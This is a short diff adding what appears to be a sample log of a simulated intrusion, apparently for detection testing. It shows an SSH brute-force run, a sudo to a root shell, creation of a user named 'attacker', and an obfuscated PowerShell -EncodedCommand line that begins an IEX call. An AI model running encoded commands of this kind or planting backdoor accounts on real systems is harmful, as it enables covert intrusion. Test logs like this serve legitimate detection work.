@@ -1,0 +1,8 @@
+Jun 18 10:01:22 server sshd[1122]: Failed password for invalid user admin from 45.33.22.10 port 53321 ssh2
+Jun 18 10:01:25 server sshd[1123]: Failed password for invalid user admin from 45.33.22.10 port 53322 ssh2
+Jun 18 10:01:28 server sshd[1124]: Failed password for invalid user admin from 45.33.22.10 port 53323 ssh2
+Jun 18 10:01:31 server sshd[1125]: Failed password for invalid user admin from 45.33.22.10 port 53324 ssh2
+Jun 18 10:01:35 server sshd[1126]: Failed password for invalid user admin from 45.33.22.10 port 53325 ssh2
+Jun 18 10:03:10 server sudo: user joel executed /bin/bash as root
+Jun 18 10:04:44 server useradd: new user attacker created
+Jun 18 10:06:12 workstation powershell.exe -EncodedCommand SQBFAFgA
